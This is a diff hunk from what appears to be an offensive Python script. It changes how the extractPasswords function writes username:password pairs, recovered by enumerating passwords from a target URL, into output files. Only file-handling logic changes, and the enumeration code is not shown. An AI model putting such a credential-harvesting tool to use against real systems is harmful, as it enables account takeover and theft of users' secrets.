@@ -91,28 +91,35 @@ def extractPasswords(url, proxy_url=None, user_file=None, usernames_list=None, o
     
     credentials = []
     passwords_only = []
+    files_created = False
     
-    with open(output_file, "w") as f_creds, open(passwords_file, "w") as f_pass:
-        for username in usernames:
-            password = enumeratePassword(url, session, username, p1)
+    for username in usernames:
+        password = enumeratePassword(url, session, username, p1)
+        
+        if password:
+            log.success(f"✓ Credentials found -> {username}:{password}")
+            credential = f"{username}:{password}"
+            credentials.append(credential)
+            passwords_only.append(password)
             
-            if password:
-                log.success(f"✓ Credentials found -> {username}:{password}")
-                credential = f"{username}:{password}"
-                credentials.append(credential)
-                passwords_only.append(password)
-                
+            mode = 'a' if files_created else 'w'
+            
+            with open(output_file, mode) as f_creds:
                 f_creds.write(f"{credential}\n")
-                f_creds.flush()
-                
+            
+            with open(passwords_file, mode) as f_pass:
                 f_pass.write(f"{password}\n")
-                f_pass.flush()
-            else:
-                log.warning(f"No password found for {username}")
+            
+            files_created = True
+        else:
+            log.warning(f"No password found for {username}")
     
-    log.info(f"Total passwords found: {len(credentials)}")
-    log.info(f"Credentials saved in {output_file}")
-    log.info(f"Passwords saved in {passwords_file}")    
+    if credentials:
+        log.info(f"Total passwords found: {len(credentials)}")
+        log.info(f"Credentials saved in {output_file}")
+        log.info(f"Passwords saved in {passwords_file}")
+    else:
+        log.failure("No passwords found")
 
 if __name__ == '__main__':
     
